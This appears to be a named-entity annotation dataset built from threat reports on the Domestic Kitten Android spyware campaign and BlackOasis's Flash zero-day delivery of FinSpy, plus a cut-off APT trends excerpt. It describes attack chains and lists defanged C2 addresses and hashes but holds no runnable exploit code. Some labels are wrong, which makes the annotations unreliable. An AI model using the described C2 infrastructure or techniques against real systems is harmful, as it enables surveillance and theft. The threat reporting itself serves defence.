Victims are first lured into downloading applications which is believed to be of interest to
them. The applications our researchers discovered included an ",O
Domestic Kitten An Iranian Surveillance Operation,ISIS,org
Domestic Kitten An Iranian Surveillance Operation," branded wallpaper
changer, “updates” from the ",O
Domestic Kitten An Iranian Surveillance Operation,ANF,org
Domestic Kitten An Iranian Surveillance Operation, ,O
Domestic Kitten An Iranian Surveillance Operation,Kurdistan news agency,org
Domestic Kitten An Iranian Surveillance Operation," and a fake version of the
messaging app, ",O
Domestic Kitten An Iranian Surveillance Operation,Vidogram,software
Domestic Kitten An Iranian Surveillance Operation,".

Regarding the ",O
Domestic Kitten An Iranian Surveillance Operation,ISIS,org
Domestic Kitten An Iranian Surveillance Operation,"-themed application, its main functionality is setting wallpapers of ",O
Domestic Kitten An Iranian Surveillance Operation,ISIS,org
Domestic Kitten An Iranian Surveillance Operation,"
pictures, and therefore seems to be targeting the terror organization’s advocates.
Curiously, its Arabic name is grammatically incorrect (“ ةیمالسالا ةفالخ  ةلود  ”, which should
instead be “ ةیمالسالا ةفالخلا  ةلود  ”).

Figure 1: The application offering ",O
Domestic Kitten An Iranian Surveillance Operation,ISIS,org
Domestic Kitten An Iranian Surveillance Operation,"-related
wallpapers.

2/12

https://www.reuters.com/article/us-iran-cyber/once-kittens-in-cyber-spy-world-iran-gains-prowess-security-experts-idUSKCN1BV1VA


Figure 2: ",O
Domestic Kitten An Iranian Surveillance Operation,ANF News Agency,org
Domestic Kitten An Iranian Surveillance Operation," website, on which the decoy app is based.

With regards to the ",O
Domestic Kitten An Iranian Surveillance Operation,ANF News Agency,org
Domestic Kitten An Iranian Surveillance Operation," app, while ",O
Domestic Kitten An Iranian Surveillance Operation,ANF,org
Domestic Kitten An Iranian Surveillance Operation," is a legitimate Kurdish news website
its app has been fabricated by the attackers to pose as the legitimate app in order to
deceive their targets.

Due to the names and content that is offered by the above mentioned applications then, we
are lead to believe that specific political groups and users, mainly ",O
Domestic Kitten An Iranian Surveillance Operation,ISIS,org
Domestic Kitten An Iranian Surveillance Operation," supporters and the
Kurdish ethnic group, are targeted by the operation.

However, when most of the victims are actually Iranian citizens, it raises more pertinent
questions about who may be behind the attack.  Due to the attack infrastructure, reviewed
below, and its consistency with previous investigations of state-sponsored Iranian
operations covered by ",O
Domestic Kitten An Iranian Surveillance Operation,Check Point,org
Domestic Kitten An Iranian Surveillance Operation," researchers, we were led to believe that Iranian
government agencies may well be behind the campaign.

Technical Analysis

A closer look at each of the applications used in the campaign show them to have the
same certificate that was issued in ",O
Domestic Kitten An Iranian Surveillance Operation,2016,timestamp
Domestic Kitten An Iranian Surveillance Operation,". This certificate is associated with the e-mail
address ‘",O
Domestic Kitten An Iranian Surveillance Operation,telecom2016@yahoo[.]com,ioc
Domestic Kitten An Iranian Surveillance Operation,"’, as seen below.

Figure 3: Attack applications certificate uses the same email address
‘",O
Domestic Kitten An Iranian Surveillance Operation,telecom2016@yahoo[.]com,ioc
Domestic Kitten An Iranian Surveillance Operation,"’

3/12



Unfortunately not much is known about this e-mail address, as it was not used to register
any domain names or to launch attacks in the past.

Another unique characteristic of the applications used, though, is that all of the samples
analyzed have several classes that are under a misspelled package name,
“",O
Domestic Kitten An Iranian Surveillance Operation,andriod.browser,ioc
Domestic Kitten An Iranian Surveillance Operation,"”.

Figure 4: The malicious applications’ classes.

These classes are seen to be in charge of data
exfiltration, collecting sensitive information from the
victim’s device. Such information includes:

SMS/MMS messages
phone calls records
Contacts list
Browser history and bookmarks
External storage
Application list
Clipboard content
Geo-location and camera photos

Interestingly, they also collect surrounding voice
recordings.

4/12



Figure 5: Examples of the malicious code.

All of the stolen data is then send back to C&C servers using HTTP POST requests.
Additionally, one of the applications contacts ",O
Domestic Kitten An Iranian Surveillance Operation,firmwaresystemupdate[.]com,ioc
Domestic Kitten An Iranian Surveillance Operation,", a newly
registered website that was seen to resolve to an Iranian IP address at first, but then
switched to a Russian address.

Figure 6: One of the decoy applications contact ",O
Domestic Kitten An Iranian Surveillance Operation,firmwaresystemupdate[.]com,ioc
Domestic Kitten An Iranian Surveillance Operation,"

The rest of the applications contact IP addresses directly, which unlike the previous
domain, are base64 encoded and XORed:

Figure 7: The C&C decoding.

Although these IP addresses were contacted directly, they are newly registered domains
that resolve to each of the IP addresses and they all follow the same pattern of a first
name-surname naming convention:

5/12



",O
Domestic Kitten An Iranian Surveillance Operation,Stevenwentz[.]com,ioc
Domestic Kitten An Iranian Surveillance Operation,"

",O
Domestic Kitten An Iranian Surveillance Operation,Ronaldlubbers[.]site,ioc
Domestic Kitten An Iranian Surveillance Operation,"

",O
Domestic Kitten An Iranian Surveillance Operation,Georgethompson[.]space,ioc
Domestic Kitten An Iranian Surveillance Operation,"

Each victim then receives a unique device UUID (a UUID is the encoded value of device’s
android_id), which appears at the beginning of each log that is sent back to the attacker,
with the title of each log having the same structure: UUID_LogDate_LogTime.log.

When a log is created for a victim, some basic information is then collected and
documented prior to the logging of phone call details. In addition, all the logs use a unique
delimiter “~~~” to separate between the fields of the stolen data:

Figure 8: SMS log example.

The different classes then collect relevant
data, and add them to such a log that is then
zipped. Afterwards, the archive is encrypted
using AES, with the device UUID as the
encryption key, as seen in the below code:

Figure 9: The application’s encryption method.

This information is collected and sent back to C&C servers when the command is received
from the attacker. These commands also follow the same structure as the log, as it uses
the same delimiter, and can include things such as “Get File”, “Set Server”, “Get Contacts”
and more:

6/12



Figure 10: Example of commands sent from the server.

As a result of all the above, this glance into inner working of this attack infrastructure
therefore allowed us to form a precise idea about how wide this attack is and the victims
targeted.

Victim Distribution

Having analyzed the full extent of the operation, as well as some extensive information
about the attacked devices and the log files collected, we understood that around 240 users
have so far fallen victim to this surveillance campaign.

In addition, due to careful documentation of the campaign by its creators showed we were
able to learn that over 97% of its victims are Iranian, consistently aligning with our
estimation that this campaign is of Iranian origin.

In addition to the Iranian targets discovered, we also found victims from Afghanistan, Iraq
and Great Britain. Interestingly, the log documentation includes the name of the malicious
application used to intercept the victims’ data, as well as an Application Code Name field.

This field includes a short description of the app, which leads us to believe that this is a field
used by the attackers to instantly recognize the application used by the victim. Observed
code names includes ‘Daesh4’ (",O
Domestic Kitten An Iranian Surveillance Operation,ISIS4,org
Domestic Kitten An Iranian Surveillance Operation,"), ‘Military News’, ‘Weapon2’, ‘Poetry Kurdish’.

Below is a visualization of the attacked devices and mobile vendors that were documented
in the logs:

7/12



Figure 11: A breakdown of attacked devices and mobile vendors.

While the number of victims and their characteristics are detailed above, the number of
people affected by this operation is actually much higher. This is due to the fact that the full
contact list stored in each victim’s mobile device, including full names and at least one of
their phone numbers, was also harvested by the attackers.

In addition, due to phone calls, SMS details, as well as the actual SMS messages, also
recorded by the attackers, the private information of thousands of totally unrelated users
has also been compromised.

————————————————————————————————————————-

",O
Domestic Kitten An Iranian Surveillance Operation,Check Point,org
Domestic Kitten An Iranian Surveillance Operation,"’s Mobile solutions can protect against this type of attack. For enterprises, read
more about ",O
Domestic Kitten An Iranian Surveillance Operation,Check Point’s Sand Blast Mobile,software
Domestic Kitten An Iranian Surveillance Operation,", and for consumers ",O
Domestic Kitten An Iranian Surveillance Operation,"Check Point’s Zone Alarm
Mobile",software
Domestic Kitten An Iranian Surveillance Operation,", to learn how you can protect your device from malicious and invasive mobile
malware.

We wish to thank ",O
Domestic Kitten An Iranian Surveillance Operation,Dr. Raz Zimmt,identity
Domestic Kitten An Iranian Surveillance Operation,", an expert on ",O
Domestic Kitten An Iranian Surveillance Operation,Iran,country
Domestic Kitten An Iranian Surveillance Operation, at the ,O
Domestic Kitten An Iranian Surveillance Operation,Institute for National Security Studies,org
Domestic Kitten An Iranian Surveillance Operation, (,O
Domestic Kitten An Iranian Surveillance Operation,INSS,org
Domestic Kitten An Iranian Surveillance Operation,"), for his illuminating insights.

Indicators of Compromise

",O
Domestic Kitten An Iranian Surveillance Operation,c168f3ea7d0e2cee91612bf86c5d95167d26e69c,ioc
Domestic Kitten An Iranian Surveillance Operation,"

",O
Domestic Kitten An Iranian Surveillance Operation,0fafeb1cbcd6b19c46a72a26a4b8e3ed588e385f,ioc
Domestic Kitten An Iranian Surveillance Operation,"

",O
Domestic Kitten An Iranian Surveillance Operation,f1355dfe633f9e1350887c31c67490d928f4feec,ioc
Domestic Kitten An Iranian Surveillance Operation,"

",O
Domestic Kitten An Iranian Surveillance Operation,d1f70c47c016f8a544ef240487187c2e8ea78339,ioc
Domestic Kitten An Iranian Surveillance Operation,"

",O
Domestic Kitten An Iranian Surveillance Operation,162[.]248[.]247[.]172,ioc
Domestic Kitten An Iranian Surveillance Operation,"

8/12

https://www.checkpoint.com/products/mobile-threat-defense/
https://www.zonealarm.com/


",O
Domestic Kitten An Iranian Surveillance Operation,190[.]2[.]144[.]140,ioc
Domestic Kitten An Iranian Surveillance Operation,"

",O
Domestic Kitten An Iranian Surveillance Operation,190[.]2[.]145[.]145,ioc
Domestic Kitten An Iranian Surveillance Operation,"

",O
Domestic Kitten An Iranian Surveillance Operation,89[.]38[.]98[.]49,ioc
Domestic Kitten An Iranian Surveillance Operation,"

",O
Domestic Kitten An Iranian Surveillance Operation,Firmwaresystemupdate[.]com,ioc
Domestic Kitten An Iranian Surveillance Operation,"

",O
Domestic Kitten An Iranian Surveillance Operation,Stevenwentz[.]com,ioc
Domestic Kitten An Iranian Surveillance Operation,"

",O
Domestic Kitten An Iranian Surveillance Operation,Ronaldlubbers[.]site,ioc
Domestic Kitten An Iranian Surveillance Operation,"

",O
Domestic Kitten An Iranian Surveillance Operation,Georgethompson[.]space,ioc
Domestic Kitten An Iranian Surveillance Operation,"

Related Articles

The ‘",O
Domestic Kitten An Iranian Surveillance Operation,Gazorp,malware
Domestic Kitten An Iranian Surveillance Operation,’ Dark Web ,O
Domestic Kitten An Iranian Surveillance Operation,Azorult,malware
Domestic Kitten An Iranian Surveillance Operation," Builder

9/12



",O
Domestic Kitten An Iranian Surveillance Operation,Ransom Warrior,malware
Domestic Kitten An Iranian Surveillance Operation," Decryption Tool

",O
Domestic Kitten An Iranian Surveillance Operation,Faxploit,malware
Domestic Kitten An Iranian Surveillance Operation,": Sending Fax Back to the Dark Ages

10/12



",O
Domestic Kitten An Iranian Surveillance Operation,EternalBlue,malware
Domestic Kitten An Iranian Surveillance Operation," – Everything There Is To Know

Meet ",O
Domestic Kitten An Iranian Surveillance Operation,Black Rose Lucy,malware
Domestic Kitten An Iranian Surveillance Operation,", the Latest Russian ",O
Domestic Kitten An Iranian Surveillance Operation,MaaS Botnet,malware
Domestic Kitten An Iranian Surveillance Operation,"

11/12



",O
Domestic Kitten An Iranian Surveillance Operation,CeidPageLock,malware
Domestic Kitten An Iranian Surveillance Operation,": A Chinese RootKit

Interactive Mapping of ",O
Domestic Kitten An Iranian Surveillance Operation,APT-C-23,threat_actor
Domestic Kitten An Iranian Surveillance Operation,"

12/12


	",O
Domestic Kitten An Iranian Surveillance Operation,Domestic Kitten,threat_actor
Domestic Kitten An Iranian Surveillance Operation,": An Iranian Surveillance Operation
	Related Articles
	The ‘",O
Domestic Kitten An Iranian Surveillance Operation,Gazorp,malware
Domestic Kitten An Iranian Surveillance Operation,’ Dark Web ,O
Domestic Kitten An Iranian Surveillance Operation,Azorult,malware
Domestic Kitten An Iranian Surveillance Operation," Builder
	",O
Domestic Kitten An Iranian Surveillance Operation,Ransom Warrior,malware
Domestic Kitten An Iranian Surveillance Operation," Decryption Tool
	",O
Domestic Kitten An Iranian Surveillance Operation,Faxploit,malware
Domestic Kitten An Iranian Surveillance Operation,": Sending Fax Back to the Dark Ages
	",O
Domestic Kitten An Iranian Surveillance Operation,EternalBlue,malware
Domestic Kitten An Iranian Surveillance Operation," – Everything There Is To Know
	Meet ",O
Domestic Kitten An Iranian Surveillance Operation,Black Rose Lucy,malware
Domestic Kitten An Iranian Surveillance Operation,", the Latest Russian ",O
Domestic Kitten An Iranian Surveillance Operation,MaaS Botnet,malware
Domestic Kitten An Iranian Surveillance Operation,"
	",O
Domestic Kitten An Iranian Surveillance Operation,CeidPageLock,malware
Domestic Kitten An Iranian Surveillance Operation,": A Chinese RootKit
	Interactive Mapping of ",O
Domestic Kitten An Iranian Surveillance Operation,APT-C-23,threat_actor
BlackOasis,More information about ,O
BlackOasis,BlackOasis,threat_actor
BlackOasis, ,O
BlackOasis,APT,threat_actor
BlackOasis," is available to customers of

",O
BlackOasis,Kaspersky,org
BlackOasis," Intelligence Reporting Service. Contact:

intelreports@kaspersky.com

Introduction
",O
BlackOasis,Kaspersky Lab,org
BlackOasis," has always worked closely with vendors to protect users.

As soon as we find new vulnerabilities we immediately inform the vendor

in a responsible manner and provide all the details required for a fix.

On ",O
BlackOasis,"October 10, 2017",timestamp
BlackOasis,", ",O
BlackOasis,Kaspersky Lab,org
BlackOasis,"’s advanced exploit prevention

systems identified a new ",O
BlackOasis,Adobe Flash,software
BlackOasis," zero day exploit used in the wild

against our customers. The exploit was delivered through a ",O
BlackOasis,Microsoft Office,software
BlackOasis, document and the final payload was the latest version of ,O
BlackOasis,FINSPY,malware
BlackOasis,"

malware. We have reported the bug to ",O
BlackOasis,Adobe,org
BlackOasis, who assigned it ,O
BlackOasis,CVE-2017-11292,O
BlackOasis," and released a patch earlier today:

So far only one attack has been observed in our customer base, leading us

to believe the number of attacks are minimal and highly targeted.

Analysis of the payload allowed us to confidently link this attack to an

actor we track as “",O
BlackOasis,BlackOasis,threat_actor
BlackOasis,"”. We are also highly confident that

",O
BlackOasis,BlackOasis,threat_actor
BlackOasis, was also responsible for another zero day exploit (,O
BlackOasis,CVE-2017-8759,O
BlackOasis,) discovered by ,O
BlackOasis,FIREEYE,org
BlackOasis, in ,O
BlackOasis,September 2017,timestamp
BlackOasis,".  The FinSpy payload used

in the current attacks (",O
BlackOasis,CVE-2017-11292,O
BlackOasis,") shares the same command and

control (C2) server as the payload used with ",O
BlackOasis,CVE-2017-8759,O
BlackOasis," uncovered

by ",O
BlackOasis,FIREEYE,org
BlackOasis,".

new targeted attacks
leveraging zero-day
exploit
By ",O
BlackOasis,GReAT,org
BlackOasis, on ,org
BlackOasis,"October 16, 2017. 2:28 pm",timestamp
BlackOasis,"

mailto:intelreports@kaspersky.com
https://helpx.adobe.com/security/products/flash-player/apsb17-32.html
https://cdn.securelist.com/files/2017/10/cve_2017_11292_credits.png
https://www.fireeye.com/blog/threat-research/2017/09/zero-day-used-to-distribute-finspy.html
https://securelist.com/author/great/


",O
BlackOasis,BlackOasis,threat_actor
BlackOasis," Background
We first became aware of ",O
BlackOasis,BlackOasis,threat_actor
BlackOasis,’ activities in ,O
BlackOasis,May 2016,timestamp
BlackOasis,", while

investigating another ",O
BlackOasis,Adobe Flash,software
BlackOasis, zero day. On ,O
BlackOasis,"May 10, 2016",timestamp
BlackOasis,", ",O
BlackOasis,Adobe,org
BlackOasis,"

warned of a vulnerability (",O
BlackOasis,CVE-2016-4117,O
BlackOasis,) affecting ,O
BlackOasis,Flash Player 21.0.0.226,software
BlackOasis, and earlier versions for ,O
BlackOasis,Windows,software
BlackOasis,", ",O
BlackOasis,Macintosh,software
BlackOasis,", ",O
BlackOasis,Linux,software
BlackOasis,", and

",O
BlackOasis,Chrome OS,software
BlackOasis,". The vulnerability was actively being exploited in the wild.

",O
BlackOasis,Kaspersky Lab,org
BlackOasis," was able to identify a sample exploiting this vulnerability

that was uploaded to a multi scanner system on ",O
BlackOasis,"May 8, 2016",timestamp
BlackOasis,". The sample,

in the form of an RTF document, exploited ",O
BlackOasis,CVE-2016-4117,O
BlackOasis," to download

and install a program from a remote C&C server. Although the exact

payload of the attack was no longer in the C&C, the same server was

hosting multiple ",O
BlackOasis,FINSPY,malware
BlackOasis," installation packages.

Leveraging data from ",O
BlackOasis,Kaspersky Security Network,software
BlackOasis,", we identified two

other similar exploit chains used by ",O
BlackOasis,BlackOasis,threat_actor
BlackOasis, in ,O
BlackOasis,June 2015,timestamp
BlackOasis," which were

zero days at the time.  Those include ",O
BlackOasis,CVE-2015-5119,O
BlackOasis, and ,O
BlackOasis,CVE-2016-0984,O
BlackOasis,", which were patched in ",O
BlackOasis,July 2015,timestamp
BlackOasis, and ,O
BlackOasis,February 2016,timestamp
BlackOasis," respectively. 

These exploit chains also delivered ",O
BlackOasis,FINSPY,malware
BlackOasis," installation packages.

Since the discovery of ",O
BlackOasis,BlackOasis,threat_actor
BlackOasis,"’ exploitation network, we’ve been

tracking this threat actor with the purpose of better understanding their

operations and targeting and have seen a couple dozen new attacks.

Some lure documents used in these attacks are shown below:

https://helpx.adobe.com/security/products/flash-player/apsa16-02.html
https://cdn.securelist.com/files/2017/10/171016-blackoasis-1.png


Decoy documents used in ",O
BlackOasis,BlackOasis,threat_actor
BlackOasis," attacks

To summarize, we have seen ",O
BlackOasis,BlackOasis,threat_actor
BlackOasis," utilizing at least five zero days

",O
BlackOasis,since June 2015,timestamp
BlackOasis,":

",O
BlackOasis,CVE-2015-5119,O
BlackOasis, – ,O
BlackOasis,June 2015,timestamp
BlackOasis,"

",O
BlackOasis,CVE-2016-0984,O
BlackOasis, – ,O
BlackOasis,June 2015,timestamp
BlackOasis,"

",O
BlackOasis,CVE-2016-4117,O
BlackOasis, – ,O
BlackOasis,May 2016,timestamp
BlackOasis,"

",O
BlackOasis,CVE-2017-8759,O
BlackOasis, – ,O
BlackOasis,Sept 2017,timestamp
BlackOasis,"

",O
BlackOasis,CVE-2017-11292,O
BlackOasis, – ,O
BlackOasis,Oct 2017,timestamp
BlackOasis,"

Attacks Leveraging ",O
BlackOasis,CVE-2017-11292,O
BlackOasis,"
The attack begins with the delivery of an ",O
BlackOasis,Office,software
BlackOasis," document, presumably in

this instance via e-mail.  Embedded within the document is an ",O
BlackOasis,ActiveX,software
BlackOasis,"

object which contains the ",O
BlackOasis,Flash,software
BlackOasis," exploit.

https://cdn.securelist.com/files/2017/10/171016-blackoasis-2.png


",O
BlackOasis,Flash,software
BlackOasis," object in the .docx file, stored in uncompressed format

The ",O
BlackOasis,Flash,software
BlackOasis," object contains an ActionScript which is responsible for

extracting the exploit using a custom packer seen in other ",O
BlackOasis,FINSPY,malware
BlackOasis," exploits.

Unpacking routine for SWF exploit

https://cdn.securelist.com/files/2017/10/171016-blackoasis-3.png
https://cdn.securelist.com/files/2017/10/171016-blackoasis-4.png
https://cdn.securelist.com/files/2017/10/171016-blackoasis-5.png


The exploit is a memory corruption vulnerability that exists in the

“com.adobe.tvsdk.mediacore.BufferControlParameters” class.  If the

exploit is successful, it will gain arbitrary read / write operations within

memory, thus allowing it to execute a second stage shellcode.

The first stage shellcode contains an interesting NOP sled with alternative

instructions, which was most likely designed in such a way to avoid

detection by antivirus products looking for large NOP blocks inside ",O
BlackOasis,flash,software
BlackOasis,"

files:

NOP sled composed of 0x90 and 0x91 opcodes

The main purpose of the initial shellcode is to download second stage

shellcode from ",O
BlackOasis,hxxp://89.45.67[.]107/rss/5uzosoff0u.iaf,ioc
BlackOasis,".

https://cdn.securelist.com/files/2017/10/171016-blackoasis-6.png
https://cdn.securelist.com/files/2017/10/171016-blackoasis-7.png


Second stage shellcode

The second stage shellcode will then perform the following actions:

1. Download the final payload (",O
BlackOasis,FINSPY,malware
BlackOasis,") from

",O
BlackOasis,hxxp://89.45.67[.]107/rss/mo.exe,ioc
BlackOasis,"

2. Download a lure document to display to the victim from the same IP

3. Execute the payload and display the lure document

Payload – mo.exe

As mentioned earlier, the “",O
BlackOasis,mo.exe,ioc
BlackOasis,"” payload (MD5:

",O
BlackOasis,4a49135d2ecc07085a8b7c5925a36c0a,ioc
BlackOasis,) is the newest version of ,O
BlackOasis,Gamma International,threat_actor
BlackOasis,’s ,O
BlackOasis,FinSpy,malware
BlackOasis," malware, typically sold to nation states and other

law enforcement agencies to use in lawful surveillance operations.  This

newer variant has made it especially difficult for researchers to analyze

the malware due to many added anti-analysis techniques, to include a

custom packer and virtual machine to execute code.

The PCODE of the virtual machine is packed with the aplib packer.

Part of packed VM PCODE

After unpacking, the PCODE it will look like the following:

https://cdn.securelist.com/files/2017/10/171016-blackoasis-8.png


Unpacked PCODE

After unpacking the virtual machine PCODE is then decrypted:

Decrypted VM PCODE

The custom virtual machine supports a total of 34 instructions:

Example of parsed PCODE

In this example, the “1b” instruction is responsible for executing native

code that is specified in parameter field.

Once the payload is successfully executed, it will proceed to copy files to

the following locations:

https://cdn.securelist.com/files/2017/10/171016-blackoasis-9.png
https://cdn.securelist.com/files/2017/10/171016-blackoasis-10.png
https://cdn.securelist.com/files/2017/10/171016-blackoasis-11.png


C:\ProgramData\ManagerApp\AdapterTroubleshooter.exe

C:\ProgramData\ManagerApp\15b937.cab

C:\ProgramData\ManagerApp\install.cab

C:\ProgramData\ManagerApp\msvcr90.dll

C:\ProgramData\ManagerApp\d3d9.dll

The “AdapterTroubleshooter.exe” file is a legitimate binary which is

leveraged to use the famous DLL search order hijacking technique.  The

“",O
BlackOasis,d3d9.dll,ioc
BlackOasis,"” file is malicious and is loaded into memory by the legit binary

upon execution.  Once loaded, the DLL will then inject ",O
BlackOasis,FINSPY,malware
BlackOasis," into the

Winlogon process.

Part of injected code in winlogon process

The payload calls out to three C2 servers for further control and

exfiltration of data. We have observed two of them used in the past with

other ",O
BlackOasis,FINSPY,malware
BlackOasis," payloads. Most recently one of these C2 servers was used

together with ",O
BlackOasis,CVE-2017-8759,O
BlackOasis, in the attacks reported by ,O
BlackOasis,FIREEYE,org
BlackOasis," in

",O
BlackOasis,September 2017,timestamp
BlackOasis,". These IPs and other previous samples tie closely to the

",O
BlackOasis,BlackOasis,threat_actor
BlackOasis, ,O
BlackOasis,APT,threat_actor
BlackOasis, cluster of ,O
BlackOasis,FINSPY,malware
BlackOasis," activity.

Targeting and Victims
",O
BlackOasis,BlackOasis,threat_actor
BlackOasis,"’ interests span a wide gamut of figures involved in Middle

Eastern politics and verticals disproportionately relevant to the region.

This includes prominent figures in the ",O
BlackOasis,United Nations,org
BlackOasis,", opposition

bloggers and activists, and regional news correspondents. ",O
BlackOasis,During 2016,timestamp
BlackOasis,",

we observed a heavy interest in ",O
BlackOasis,Angola,country
BlackOasis,", exemplified by lure documents

indicating targets with suspected ties to ",O
BlackOasis,oil,industry
BlackOasis,", ",O
BlackOasis,money laundering,industry
BlackOasis,", and other

illicit activities. There is also an interest in international activists and think

tanks.

Victims of ",O
BlackOasis,BlackOasis,threat_actor
BlackOasis," have been observed in the following countries:

",O
BlackOasis,Russia,country
BlackOasis,", ",O
BlackOasis,Iraq,country
BlackOasis,", ",O
BlackOasis,Afghanistan,country
BlackOasis,", ",O
BlackOasis,Nigeria,country
BlackOasis,", ",O
BlackOasis,Libya,country
BlackOasis,", ",O
BlackOasis,Jordan,country
BlackOasis,", ",O
BlackOasis,Tunisia,country
BlackOasis,", ",O
BlackOasis,Saudi Arabia,country
BlackOasis,", ",O
BlackOasis,Iran,country
BlackOasis,",

",O
BlackOasis,Netherlands,country
BlackOasis,", ",O
BlackOasis,Bahrain,country
BlackOasis,", ",O
BlackOasis,United Kingdom,country
BlackOasis, and ,O
BlackOasis,Angola,country
BlackOasis,".

Conclusions
We estimate that the attack on ",O
BlackOasis,HackingTeam,org
BlackOasis, ,O
BlackOasis,in mid-2015,timestamp
BlackOasis," left a gap on the

market for surveillance tools, which is now being filled by other

companies. One of these is ",O
BlackOasis,Gamma International,threat_actor
BlackOasis, with their ,O
BlackOasis,FinFisher,malware
BlackOasis," suite

https://cdn.securelist.com/files/2017/10/171016-blackoasis-12.png


of tools. Although ",O
BlackOasis,Gamma International,threat_actor
BlackOasis," itself was hacked by Phineas

Fisher in ",O
BlackOasis,2014,timestamp
BlackOasis,", the breach was not as serious as it was in the case of

",O
BlackOasis,HackingTeam,org
BlackOasis,". Additionally, ",O
BlackOasis,Gamma,threat_actor
BlackOasis," had two years to recover from the

attack and pick up the pace.

We believe the number of attacks relying on ",threat_actor
BlackOasis,FinFisher,malware
BlackOasis," software, supported

by zero day exploits such as the ones described here will continue to

grow.

What does it mean for everyone and how to defend against such attacks,

including zero-day exploits?

For ",O
BlackOasis,CVE-2017-11292,O
BlackOasis," and other similar vulnerabilities, one can use the

killbit for ",O
BlackOasis,Flash,software
BlackOasis," within their organizations to disable it in any applications

that respect it.  Unfortunately, doing this system-wide is not easily done,

as ",O
BlackOasis,Flash,software
BlackOasis," objects can be loaded in applications that potentially do not

follow the killbit. Additionally, this may break any other necessary

resources that rely on ",O
BlackOasis,Flash,software
BlackOasis," and of course, it will not protect against

exploits for other third party software.

Deploying a multi-layered approach including access policies, anti-virus,

network monitoring and whitelisting can help ensure customers are

protected against threats such as this.  Users of ",O
BlackOasis,Kaspersky,org
BlackOasis," products are

protected as well against this threat by one of the following detections:

",O
BlackOasis,"

PDM:Exploit.Win32.Generic

HEUR:Exploit.SWF.Generic

HEUR:Exploit.MSOffice.Generic

More information about ",O
BlackOasis,BlackOasis,threat_actor
BlackOasis, ,O
BlackOasis,APT,threat_actor
BlackOasis," is available to customers of

",O
BlackOasis,Kaspersky,org
BlackOasis," Intelligence Reporting Service. Contact:

intelreports@kaspersky.com

Acknowledgements
We would like to thank the ",O
BlackOasis,Adobe Product Security Incident Response Team,org
BlackOasis, (,O
BlackOasis,PSIRT,org
BlackOasis,") for working with us to identify and patch this vulnerability.

References
1. ",O
BlackOasis,Adobe,org
BlackOasis," Bulletin https://helpx.adobe.com/security/products/flash-

player/apsb17-32.html

Indicators of compromise

https://answers.microsoft.com/en-us/windows/forum/windows_8-update/flashplayer-updates/cd258a3f-cd87-4ea9-bdb6-074d06ad491e?auth=1
mailto:intelreports@kaspersky.com
https://helpx.adobe.com/security/products/flash-player/apsb17-32.html


Share post on:

THERE ARE 2 COMMENTS

",O
BlackOasis,4a49135d2ecc07085a8b7c5925a36c0a,ioc
BlackOasis,"

",O
BlackOasis,89.45.67[.]107,ioc
BlackOasis,"

",O
BlackOasis,ADOBE,org
BlackOasis,  ,O
BlackOasis,APT,threat_actor
BlackOasis,  ,O
BlackOasis,MICROSOFT WORD,software
BlackOasis,"

VULNERABILITIES AND EXPLOITS  ZERO-DAY EXPLOIT  

ZERO-DAY VULNERABILITIES

Related Posts

",O
BlackOasis,Ryan,identity
BlackOasis,"
Posted on ",O
BlackOasis,"October 16, 2017. 11:54 pm",timestamp
BlackOasis,"

Does EMET block the ",O
BlackOasis,flash,software
BlackOasis," exploit?

REPLY

",O
BlackOasis,Faron Faulk,identity
BlackOasis,"
Posted on ",O
BlackOasis,"October 17, 2017. 5:04 pm",timestamp
BlackOasis,"

fixed 

https://portal.msrc.microsoft.com/en-US/security-

guidance/advisory/ADV170018

REPLY

    

The Festive
Complexities
of SIGINT-
Capable Threat
Actors

A simple
example of a
complex
cyberattack

An
(un)documented
Word feature
abused by
attackers

https://securelist.com/all?tag=31
https://securelist.com/all?tag=538
https://securelist.com/all?tag=172
https://securelist.com/all?tag=41
https://securelist.com/all?tag=923
https://securelist.com/all?tag=54
https://securelist.com/blackoasis-apt-and-new-targeted-attacks-leveraging-zero-day-exploit/82732/?replytocom=1584794#respond
https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/ADV170018
https://securelist.com/blackoasis-apt-and-new-targeted-attacks-leveraging-zero-day-exploit/82732/?replytocom=1588376#respond
https://securelist.com/the-festive-complexities-of-sigint-capable-threat-actors/82683/
https://securelist.com/a-simple-example-of-a-complex-cyberattack/82636/
https://securelist.com/an-undocumented-word-feature-abused-by-attackers/81899/",O
APT Trends report Q2 2017,APT Trends report ,O
APT Trends report Q2 2017,Q2 2017,timestamp
APT Trends report Q2 2017,"


By ",O
APT Trends report Q2 2017,GReAT,org
APT Trends report Q2 2017,"

APT Trends report ",O
APT Trends report Q2 2017,Q2 2017,timestamp
APT Trends report Q2 2017,"
securelist.com/apt-trends-report-q2-2017/79332

Introduction

",O
APT Trends report Q2 2017,Since 2014,timestamp
APT Trends report Q2 2017,", ",O
APT Trends report Q2 2017,Kaspersky Lab,org
APT Trends report Q2 2017,’s ,O
APT Trends report Q2 2017,Global Research and Analysis Team,org
APT Trends report Q2 2017, (,O
APT Trends report Q2 2017,GReAT,org
APT Trends report Q2 2017,") has been
providing threat intelligence reports to a wide-range of customers worldwide, leading
to the delivery of a full and dedicated private reporting service. Prior to the new
service offering, ",O
APT Trends report Q2 2017,GReAT,org
APT Trends report Q2 2017," published research online for the general public in an effort to
help combat the ever-increasing threat from nation-state and other advanced actors. 
Since we began offering a threat intelligence service, all deep technical details on
advanced campaigns are first pushed to our subscriber base. At the same time, to
remain true to our efforts to help make the internet safer, important incidents, such
as ",O
APT Trends report Q2 2017,WannaCry,malware
APT Trends report Q2 2017, or ,O
APT Trends report Q2 2017,Petya,malware
APT Trends report Q2 2017," are covered in both private and public reports.

",O
APT Trends report Q2 2017,Kaspersky,org
APT Trends report Q2 2017,"’s Private Threat Intelligence Portal (TIP)

",O
APT Trends report Q2 2017,In Q1 of 2017,timestamp
APT Trends report Q2 2017," we published our first APT Trends report, highlighting our top research
findings over the last few months. We will continue to publish quarterly reports as a
representative snapshot of what has been offered in greater detail in our private
reports in order to highlight significant events and findings we feel most users should
be aware of.  If you would like to learn more about our intelligence reports or request
more information for a specific report, readers are encouraged to contact:
intelreports@kaspersky.com.

Russian-Speaking Actors

1/8

https://securelist.com/apt-trends-report-q2-2017/79332/
https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2017/08/07172607/APT-report-Q2-2017-1.png
https://securelist.com/apt-trends-report-q1-2017/78169/
https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2017/08/07172602/APT-report-Q2-2017-2.png


",O
APT Trends report Q2 2017,The second,timestamp
APT Trends report Q2 2017," quarter of 2017 has seen multiple incidents involving Russian-speaking
threat actors. Topping the list of ‘attention grabbers’ were the ",O
